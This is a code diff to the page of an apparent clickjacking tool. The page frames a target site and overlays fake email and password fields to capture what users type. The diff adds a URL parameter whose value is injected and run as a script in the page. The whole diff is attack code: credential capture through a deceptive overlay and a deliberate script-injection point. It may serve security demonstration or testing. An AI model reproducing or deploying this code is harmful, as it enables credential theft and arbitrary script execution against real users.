@@ -25,6 +25,8 @@
         }
 
         $(document).ready(function () {
+
+
             var targetURL = getURLParameter('target');
 
             var userNameTop = getURLParameter('userNameTop');
@@ -39,6 +41,7 @@
             var passwordStyleParam = getURLParameter('passwordStyle');
             var usernameStyleParam = getURLParameter('usernameStyle');
             var buttonStyleParam = getURLParameter('buttonStyle');
+            var customJavaScript = getURLParameter('customJavaScript');
 
 //            <%--EMAIL--%>
 //            var baseEmailStyle = 'outline:none; box-shadow:none;border: none !important;height: 20px;width: 325px;background-color:#f9f9f9;';
@@ -72,14 +75,24 @@
             $("#targetIframe").attr('src', targetURL);
 
             $('#jacksButton').click(function () {
-                var jacksEmail = $('#inputMalEmail').val();
-                var jacksPassword = $('#inputMalPassword').val();
 
-                console.log('Email: ' + jacksEmail);
+                if (customJavaScript != null) {
+                    $('<script>').attr('type', 'text/javascript').text(customJavaScript).appendTo('head');
+                }
 
-                alert('Hit the road Jack...\nEmail is: ' + jacksEmail + ' \nAND\n Password is: ' + jacksPassword);
+                else
+                {
+                    var jacksEmail = $('#inputMalEmail').val();
+                    var jacksPassword = $('#inputMalPassword').val();
 
-                location.reload();
+                    console.log('Email: ' + jacksEmail);
+
+                    alert('Hit the road Jack...\nEmail is: ' + jacksEmail + ' \nAND\n Password is: ' + jacksPassword);
+
+                    location.reload();
+                }
+
+
             });
 
         });
